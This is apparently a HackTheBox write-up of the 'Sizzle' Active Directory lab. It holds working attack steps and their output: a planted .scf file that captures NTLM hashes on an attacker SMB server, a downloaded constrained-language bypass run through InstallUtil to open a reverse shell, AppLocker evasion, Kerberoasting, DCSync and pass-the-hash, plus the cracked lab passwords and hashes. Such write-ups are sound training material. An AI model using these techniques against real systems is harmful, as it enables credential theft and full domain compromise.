---
title: "Sizzle"
date: 2025-06-20
categories:
  - HackTheBox
  - Active Directory
  - Windows
tags:
  - HackTheBox
  - Active Directory
---

# Sizzle

![](assets/Pasted%20image%2020250510163822.png)
<!-- more -->

## Enumeration

```bash
$ nmap -sC -sV -Pn -T4 --min-rate 5000 -p- 10.10.10.103
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-24 09:36 CET
Nmap scan report for 10.10.10.103
Host is up (0.043s latency).
Not shown: 65507 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2024-11-24T08:38:38+00:00; +1s from scanner time.
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: 2024-11-24T08:38:38+00:00; 0s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).                                                   
445/tcp   open  microsoft-ds?                                                                          
464/tcp   open  kpasswd5?                                                                              
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                      
636/tcp   open  ssl/ldap                                                                               
|_ssl-date: 2024-11-24T08:38:37+00:00; 0s from scanner time.                                           
| ssl-cert: Subject: commonName=sizzle.htb.local                                                       
| Not valid before: 2018-07-03T17:58:55                                                                
|_Not valid after:  2020-07-02T17:58:55                                                                
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)                                                                                      
| ssl-cert: Subject: commonName=sizzle.htb.local                                                       
| Not valid before: 2018-07-03T17:58:55                                                                
|_Not valid after:  2020-07-02T17:58:55                                                                
|_ssl-date: 2024-11-24T08:38:38+00:00; +1s from scanner time.                                          
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)                                                                                      
| ssl-cert: Subject: commonName=sizzle.htb.local                                                       
| Not valid before: 2018-07-03T17:58:55                                                                
|_Not valid after:  2020-07-02T17:58:55                                                                
|_ssl-date: 2024-11-24T08:38:37+00:00; 0s from scanner time.                                           
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                  
|_http-server-header: Microsoft-HTTPAPI/2.0                                                            
|_http-title: Not Found                                                                                
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                  
|_ssl-date: 2024-11-24T08:38:38+00:00; 0s from scanner time.                                           
|_http-server-header: Microsoft-HTTPAPI/2.0                                                            
| tls-alpn:                                                                                            
|   h2                                                                                                 
|_  http/1.1                                                                                           
|_http-title: Not Found                                                                                
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL                                                       
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL       
| Not valid before: 2018-07-02T20:26:23                                                                
|_Not valid after:  2019-07-02T20:26:23                                                                
9389/tcp  open  mc-nmf        .NET Message Framing                                                     
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                  
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49730/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-11-24T08:37:59
|_  start_date: 2024-11-24T08:35:18

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 128.59 seconds

```

Ftp is empty after entering with anonymous session.

The web server has a web page with bacon.

![](assets/Pasted%20image%2020241124102134.png)

Let's fuzz the directory for new paths; nothing.

In `smb` there is a share with empty access. Inside, there are a bunch of media files and directories with user names. Let's kerbrute these names.

```bash
$ sudo mount -t cifs //10.10.10.103/Department\ shares mount -o domain=htb.local
Password for root@//10.10.10.103/Department shares: 

$ tree              
.
├── Accounting
├── Audit
├── Banking
│   └── Offshore
│       ├── Clients
│       ├── Data
│       ├── Dev
│       ├── Plans
│       └── Sites
├── CEO_protected
├── Devops
├── Finance
├── HR
│   ├── Benefits
│   ├── Corporate Events
│   ├── New Hire Documents
│   ├── Payroll
│   └── Policies
├── Infosec
├── Infrastructure
├── IT
├── Legal
├── M&A
├── Marketing
├── R&D
├── Sales
├── Security
├── Tax
│   ├── 2010
│   ├── 2011
│   ├── 2012
│   ├── 2013
│   ├── 2014
│   ├── 2015
│   ├── 2016
│   ├── 2017
│   └── 2018
├── Users
│   ├── amanda
│   ├── amanda_adm
│   ├── bill
│   ├── bob
│   ├── chris
│   ├── henry
│   ├── joe
│   ├── jose
│   ├── lkys37en
│   ├── morgan
│   ├── mrb3n
│   └── Public
└── ZZ_ARCHIVE
    ├── AddComplete.pptx
    ├── AddMerge.ram
    ├── ConfirmUnprotect.doc
    ├── ConvertFromInvoke.mov
    ├── ConvertJoin.docx
    ├── CopyPublish.ogg
    ├── DebugMove.mpg
    ├── DebugSelect.mpg
    ├── DebugUse.pptx
    ├── DisconnectApprove.ogg
    ├── DisconnectDebug.mpeg2
    ├── EditCompress.xls
    ├── EditMount.doc
    ├── EditSuspend.mp3
    ├── EnableAdd.pptx
    ├── EnablePing.mov
    ├── EnableSend.ppt
    ├── EnterMerge.mpeg
    ├── ExitEnter.mpg
    ├── ExportEdit.ogg
    ├── GetOptimize.pdf
    ├── GroupSend.rm
    ├── HideExpand.rm
    ├── InstallWait.pptx
    ├── JoinEnable.ram
    ├── LimitInstall.doc
    ├── LimitStep.ppt
    ├── MergeBlock.mp3
    ├── MountClear.mpeg2
    ├── MoveUninstall.docx
    ├── NewInitialize.doc
    ├── OutConnect.mpeg2
    ├── PingGet.dot
    ├── ReceiveInvoke.mpeg2
    ├── RemoveEnter.mpeg3
    ├── RemoveRestart.mpeg
    ├── RequestJoin.mpeg2
    ├── RequestOpen.ogg
    ├── ResetCompare.avi
    ├── ResetUninstall.mpeg
    ├── ResumeCompare.doc
    ├── SelectPop.ogg
    ├── SuspendWatch.mp4
    ├── SwitchConvertFrom.mpg
    ├── UndoPing.rm
    ├── UninstallExpand.mp3
    ├── UnpublishSplit.ppt
    ├── UnregisterPing.pptx
    ├── UpdateRead.mpeg
    ├── WaitRevoke.pptx
    └── WriteUninstall.mp3

52 directories, 51 files  

$ kerbrute userenum --dc 10.10.10.103 -d htb.local -t 60 users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/24/24 - Ronnie Flathers @ropnop

2024/11/24 17:39:05 >  Using KDC(s):
2024/11/24 17:39:05 >   10.10.10.103:88

2024/11/24 17:39:05 >  [+] VALID USERNAME:       amanda@htb.local
2024/11/24 17:39:05 >  Done! Tested 12 usernames (1 valid) in 0.051 seconds
```

We got `amanda`.

Let's enumerate folder permissions to find a write permission. We can write in `Public`.

```bash
$ sudo mount -t cifs //10.10.10.103/Department\ shares mount                                
Password for root@//10.10.10.103/Department shares: 

$ sudo touch mount/Users/Public/asdf.txt
```

But we can search all the writable folders with a little bash one-liner.

```bash
$ for directory in $(ls Users); do echo -e "\n[+] Enumerating $directory perms:\n"; echo -e "\t$(smbcacls "//10.10.10.103/Department Shares" Users/$directory -N | grep "Everyone")"; done;

[+] Enumerating amanda perms:
        ACL:Everyone:ALLOWED/OI|CI|I/READ
[+] Enumerating amanda_adm perms:
        ACL:Everyone:ALLOWED/OI|CI|I/READ
[+] Enumerating bill perms:
        ACL:Everyone:ALLOWED/OI|CI|I/READ
[+] Enumerating bob perms:
        ACL:Everyone:ALLOWED/OI|CI|I/READ
[+] Enumerating chris perms:
        ACL:Everyone:ALLOWED/OI|CI|I/READ
[+] Enumerating henry perms:
        ACL:Everyone:ALLOWED/OI|CI|I/READ
[+] Enumerating joe perms:
        ACL:Everyone:ALLOWED/OI|CI|I/READ
[+] Enumerating jose perms:
        ACL:Everyone:ALLOWED/OI|CI|I/READ
[+] Enumerating lkys37en perms:
        ACL:Everyone:ALLOWED/OI|CI|I/READ
[+] Enumerating morgan perms:
        ACL:Everyone:ALLOWED/OI|CI|I/READ
[+] Enumerating mrb3n perms:
        ACL:Everyone:ALLOWED/OI|CI|I/READ
[+] Enumerating Public perms:
        ACL:Everyone:ALLOWED/OI|CI/FULL
ACL:Everyone:ALLOWED/OI|CI|I/READ

```

There is another way without using `smbcacls`, only trying to write in every folder

```bash
$ for directory in $(find . -type d); do sudo touch "$directory/file" 2>/dev/null && echo -e "\033[32m[+] $directory is WRITABLE\033[0m" || echo -e "\033[31m[-] $directory is not writable\033[0m"; sudo rm -f "$directory/file" 2>/dev/null; done
[-] . is not writable
[-] ./Accounting is not writable
[-] ./Audit is not writable
[-] ./Banking is not writable
...
[-] ./Users/bob is not writable
[-] ./Users/chris is not writable
[-] ./Users/henry is not writable
[-] ./Users/joe is not writable
[-] ./Users/jose is not writable
[-] ./Users/lkys37en is not writable
[-] ./Users/morgan is not writable
[-] ./Users/mrb3n is not writable
[+] ./Users/Public is WRITABLE
[+] ./ZZ_ARCHIVE is WRITABLE
```

And we have `/Users/Public` and `ZZ_ARCHIVE`.

We can try to steal the NTLM hash by saving a `.scf` file ([reference](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)).

So we save a `test.scf` in a writable folder and create a `smbshare`

```bash
[Shell]
Command=2
IconFile=\\10.10.14.11\test.ico
[Taskbar]
Command=ToggleDesktop
```

```bash
$ impacket-smbserver -smb2support asdf .
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.103,59825)
[*] AUTHENTICATE_MESSAGE (HTB\amanda,SIZZLE)
[*] User SIZZLE\amanda authenticated successfully
[*] amanda::HTB:aaaaaaaaaaaaaaaa:f670b845ca06fb08959be34b74a9908e:01010000000000008045a5fba53edb01080d98e9f223bde80000000001001000620073006f00740045004d004300490003001000620073006f00740045004d00430049000200100068004c005a006f00730061004a004f000400100068004c005a006f00730061004a004f00070008008045a5fba53edb01060004000200000008003000300000000000000001000000002000006104689ba8c07c3d121e984d7faf1cde5dbad9557373c9d817fc26be20346c6e0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003100000000000000000000000000
[*] Connecting Share(1:IPC$)
[-] SMB2_TREE_CONNECT not found test.ico
[-] SMB2_TREE_CONNECT not found test.ico
[*] Disconnecting Share(1:IPC$)
[*] Closing down connection (10.10.10.103,59825)
[*] Remaining connections []

```

We have the hash for `amanda`, using `hashcat`:

```bash
$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

AMANDA::HTB:aaaaaaaaaaaaaaaa:f670b845ca06fb08959be34b74a9908e:01010000000000008045a5fba53edb01080d98e9f223bde80000000001001000620073006f00740045004d004300490003001000620073006f00740045004d00430049000200100068004c005a006f00730061004a004f000400100068004c005a006f00730061004a004f00070008008045a5fba53edb01060004000200000008003000300000000000000001000000002000006104689ba8c07c3d121e984d7faf1cde5dbad9557373c9d817fc26be20346c6e0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003100000000000000000000000000:Ashare1972
                                                          
Session..........: hashcat
```

We have `amanda:Ashare1972`.

`Evil winrm` doesn't work but there is an SSL version, so we would need a certificate.
Enumerating directories with the `iis` wordlist, we have a `/certsrv` that asks for user and password. We try `amanda`'s one.

![](assets/Pasted%20image%2020241124221643.png)

We can generate a private key and a CSR and have the CA sign it.

```bash
$ openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr 
......+.....+.........+....+......+........+.+.........+.....+.+...........+...+...+....+++++++++++++++++++++++++++++++++++++++*.....+...+.....+...+...+....+..+.+.....+..........+..+..........+..+...+......+.+...+......+.....+....+...........+......+.+..+.+.....+.+........+............+....+..+.............+..+.........+...+...+++++++++++++++++++++++++++++++++++++++*..+............+...+......+.......+.....+...+...................+...+..+.+..+.........+....+..+..........+...+......+...+..++++++
..+....+..+.........+++++++++++++++++++++++++++++++++++++++*..+....+.........+...+..+.........................+..+.+.....+....+.........+..+....+......+..+...+....+.....+...+...............+...+....+...+..+++++++++++++++++++++++++++++++++++++++*................+.........+.+......+......+........+.+...+...+..+..........+..+.............+..+...+.+..+....+...............+...+...........+.+.....+...+.+......+.........+..+...+......+...+......+........................+.......+.....+....+..+....+...+...+.....+.........+.+..+.......+.....+......+....+.....+...+.......+.........+.........+........+.........+...+.+..+....+...+........+.......+......+............+.....+.........+.........+.......+........+....+......+......+...+......+..+....+......+..+...+.......+...+..+.......+.........+......+...+..+.....................+...+....+.....+...+....+...+.....+..........+......+.....+......+....+............+...+...........+.+..+...+...+......+.+............+...+.........+........+.+.....+.......+.....+.......+.....+......+.......+........+.+...........+...+..........+.....+...................+.....+.+.....+....+......+..+....+........+............+.+..+...+....+.....+...+.......+...+......+..+.........+...+...+............+...+.......+......+...........+.+...............+...+..+.........+..........+...+......+............+..+..........+...........+....+.....+......+......+..........+........+......+....+........+.........+......+...+....+...+...+.........+..+........................+....+..+.+...+.....+.+........+.+..+....+........+...+....+..............+....+..+......+....+........+......+.+........+..........+..+.+..+......................+.....+.+..+............+.+...+.........+...+..+.+..+.............+...............+.....+.+..............+......+...+...+...+....+........+...+....+...............+...+..+.+......+...+..+......+....+.......................+.............+..+...+....+......+.........+.....+.+...+.....+............+....+...+..++++++
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:

```

Paste the CSR to the webpage and get the signed cert.

## Initial Access

```bash
$ evil-winrm -S -c certnew.cer -k amanda.key -i 10.10.10.103

Evil-WinRM shell v3.7


Warning: SSL enabled

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\amanda\Documents> whoami
amanda
```

## Privilege Escalation

So at this point with these creds, try to make a kerberoast attack. The problem is that Kerberos `port 88` is not open, so let's try from inside, with `Rubeus`

```bash
*Evil-WinRM* PS C:\Users\amanda\Documents> upload /home/kali/Downloads/Rubeus.exe
                                        
Info: Uploading /home/kali/Downloads/Rubeus.exe to C:\Users\amanda\Documents\Rubeus.exe
                                        
Error: Upload failed. Check filenames or paths: [WinRM::FS::Core::FileTransporter] Upload failed (exitcode: 0), but stderr present                                                                
Cannot invoke method. Method invocation is supported only on core types in this language mode.   
At line:51 char:12                                                                               
+     return $ExecutionContext.SessionState.Path.GetUnresolvedProviderP ...                      
+            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                          
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException              
```

We have a problem: PowerShell is not in full language mode, so we have to bypass it. [https://github.com/padovah4ck/PSByPassCLM](https://github.com/padovah4ck/PSByPassCLM)

```bash
*Evil-WinRM* PS C:\Users\amanda\Documents> Invoke-WebRequest -Uri http://10.10.14.11:8000/PsBypassCLM.exe -OutFile .\bypass.exe
*Evil-WinRM* PS C:\Users\amanda\Documents> ls


    Directory: C:\Users\amanda\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/24/2024   7:26 PM          33792 bypass.exe


*Evil-WinRM* PS C:\Users\amanda\Documents> $ExecuteContext.SessionState.LanguageMode
*Evil-WinRM* PS C:\Users\amanda\Documents> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.14.11 /rport=443 /U ./bypass.exe
Microsoft (R) .NET Framework Installation utility Version 4.6.1586.0
Copyright (C) Microsoft Corporation.  All rights reserved.



The uninstall is beginning.
See the contents of the log file for the C:\Users\amanda\Documents\bypass.exe assembly's progress.
The file is located at .
Uninstalling assembly 'C:\Users\amanda\Documents\bypass.exe'.
Affected parameters are:
   assemblypath = C:\Users\amanda\Documents\bypass.exe
   rport = 443
   revshell = true
   rhost = 10.10.14.11
   logtoconsole = true
   logfile =
Trying to connect back...
```

And we have a shell with full language mode. Now back to uploading `Rubeus`.

```bash
PS C:\Temp> .\Rubeus.exe
ERROR: Program 'Rubeus.exe' failed to run: This program is blocked by group policy. For more information, contact your system administratorAt line:1 char:1
+ .\Rubeus.exe
+ ~~~~~~~~~~~~.
```

A policy doesn't allow us to execute apps. Let's examine it.

```bash
PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : a9e18c21-ff8f-43cf-b9fc-db40eed693ba
Name                : (Default Rule) All signed packaged apps
Description         : Allows members of the Everyone group to run packaged apps that are signed.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51
Name                : (Default Rule) All files located in the Windows folder
Description         : Allows members of the Everyone group to run applications that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow
...
```

So inside `windows` we can do it from `C:\Windows\Temp`, that is allowed.

```bash
PS C:\Windows\Temp> .\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : HTB.LOCAL
[*] Searching path 'LDAP://sizzle.HTB.LOCAL/DC=HTB,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : mrlky
[*] DistinguishedName      : CN=mrlky,CN=Users,DC=HTB,DC=LOCAL
[*] ServicePrincipalName   : http/sizzle
[*] PwdLastSet             : 7/10/2018 2:08:09 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle@HTB.LOCAL*$B843F2F587CA377E97B56A34C3B8
                             B9E8$A8B1D51210F29B6A4C437AF49795465B133886A97FA1EA54EC28D9169CF5587D5858ABBBA54
                             0700378F4334492DE8A042F63A4D11BD1B2B14A9D0D419D22F093DE334EC0F6329C658BF5E325CCA
                             A008A889466985631318810816024078E24AFFECFA26D67555C646160CDBEEE7B14FA2C8FEC2F225
                             10A144FA2489CDDE8C61A2FBF31FA73F63C8D40849E3F768A2686CB7A20E3ACDC9D321A411030B4A
                             4985CADCBEE22F86E60C524FCE3ADB5B8C01FEACB8AE6FAAA7F81B2952DC879DBC1E0018A78E33BE
                             794EA70324C7505344E4F710E801D84446FEBD9CE4DC6AA863639E0D4078D62F50E486FF8ED200E3
                             6AF060C399F61CAB83EA2BC87576CE5D126FB049F5461F08268CCC0FBA635D88C8087B1D5CEE5C71
                             9F282D702EF68BA5880DADA2B5EBC3ACBC3CB7F038496CD0FB523A49D1F68161304818F44D629923
                             F9160881D55D67C51443341636C50720851710A437EE7FDC70838F494E7096708D83E002D1FB4AF4
                             88FF5F9C7A01F520A68C75DD2E050C37398C6DB4B14292B4DC3E81A7003FAE5CDB3D0D749C51ACBC
                             CAD0E53C7B846EE5852E54BD558BD54FA18E61B26571E02A33404EDE83E5524742B62B271F973C08
                             4619853B877622EC93767F3950A8304846DB73D6402C54943113BB10EFC5F35AAEB7D47CDFAEA0FD
                             B2E948AC0C781D72EB5FBD0B9B9F4760422C393927026C92576D7F5AE7E0EA888D4E0691F168B3EB
                             C36D722D03846CF9D2090AD171AFEBF213D2624173FD570E787A2E1FCEB77BA4D0F96AFE98A16C57
                             263A464E29DA2D443163759495FA9FE4431483B1363A8FA9F64E1A815E7CBB6AEBDFE111124208C6
                             B8EFF6584EDBE2FAA5B0D9505DFA521A2113FCF34D2ABEA7D34038F764AC2FCA6DDEED83F35E0562
                             444D192375B2CB9AB803E6E1295C1505BEAF8152DD1F6E2931E4E2636C8C4945B16AC9C9AE661CC3
                             CAF42349BD87EA0AA4498A982073E8AD63EA1B7230060A6871ADEBABAE07F03C04C5A6BD027D9CB6
                             11C0B7A4BC23A94A5EA93E5DAE0F1302131D183D91CEDCA4238B1F3E80C2FFC9C70161262D0D886F
                             32B6056233A6ACC02E21B499D39D05AE7BF5DC24CF4D799092B7EBE04941D43DD1D2ECAF7AD96474
                             2AE8C726C7C2A1FCAF371161654E2D2382DB9F5831065E7F068528386FCD6153ECE0903104096C66
                             1A46288B6A61E5CDC1586C0586E6B26E561354CB01FA2041E7F835DD2CB30D3E5AC2283432D9430C
                             82E227AC0E6CA48655EC3B1DE119E9F42435D4E5F418C6C879521A42BBCD255426B1B2700C8C3F0D
                             78CB51F7C5760EC028CE8590D6B4EFC97ADBE59BBC488F40A6DD671BDF0B3AB2AFEFA1003BAD5304
                             D8D5DE739B47E7E63

```

Using john

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Football#7       (?)     
1g 0:00:00:08 DONE (2024-11-25 02:29) 0.1121g/s 1251Kp/s 1251Kc/s 1251KC/s Forever3!..FokinovaS1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Execute secretsdump because mrlky can DCSync the domain.

```bash
$ impacket-secretsdump htb.local/mrlky:'Football#7'@10.10.10.103
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:2f5618088c1dd4385ae90c7059ee55e1:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:e562d64208c7df80b496af280603773ea7d7eeb93ef715392a8258214933275d
Administrator:aes128-cts-hmac-sha1-96:45b1a7ed336bafe1f1e0c1ab666336b3
Administrator:des-cbc-md5:ad7afb706715e964
krbtgt:aes256-cts-hmac-sha1-96:0fcb9a54f68453be5dd01fe555cace13e99def7699b85deda866a71a74e9391e
krbtgt:aes128-cts-hmac-sha1-96:668b69e6bb7f76fa1bcd3a638e93e699
krbtgt:des-cbc-md5:866db35eb9ec5173
amanda:aes256-cts-hmac-sha1-96:60ef71f6446370bab3a52634c3708ed8a0af424fdcb045f3f5fbde5ff05221eb
amanda:aes128-cts-hmac-sha1-96:48d91184cecdc906ca7a07ccbe42e061
amanda:des-cbc-md5:70ba677a4c1a2adf
mrlky:aes256-cts-hmac-sha1-96:b42493c2e8ef350d257e68cc93a155643330c6b5e46a931315c2e23984b11155
mrlky:aes128-cts-hmac-sha1-96:3daab3d6ea94d236b44083309f4f3db0
mrlky:des-cbc-md5:02f1a4da0432f7f7
sizzler:aes256-cts-hmac-sha1-96:85b437e31c055786104b514f98fdf2a520569174cbfc7ba2c895b0f05a7ec81d
sizzler:aes128-cts-hmac-sha1-96:e31015d07e48c21bbd72955641423955
sizzler:des-cbc-md5:5d51d30e68d092d9
SIZZLE$:aes256-cts-hmac-sha1-96:5153f5f25282b40841bc7947d928c18260901c77416cd5c924d032e418d7eed3
SIZZLE$:aes128-cts-hmac-sha1-96:8626d10ebb7862f2580530a3a67110fa
SIZZLE$:des-cbc-md5:4f8046b0f24629b9
[*] Cleaning up... 
```

Now with PTH using wmiexec

```bash
$ impacket-wmiexec htb.local/Administrator@10.10.10.103 -hashes :f6b7160bfc91823792e0ac3a162c9267
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
htb\administrator
```

## Post Exploitation

Get the flags

```shell
C:\>cd Users

C:\Users>type mrlky\Desktop\user.txt
f16365e4fbe29048b3600659b801946a

C:\Users>type administrator\Desktop\root.txt
6edbcfac09ce51ebaea5d853dc85af4b
```
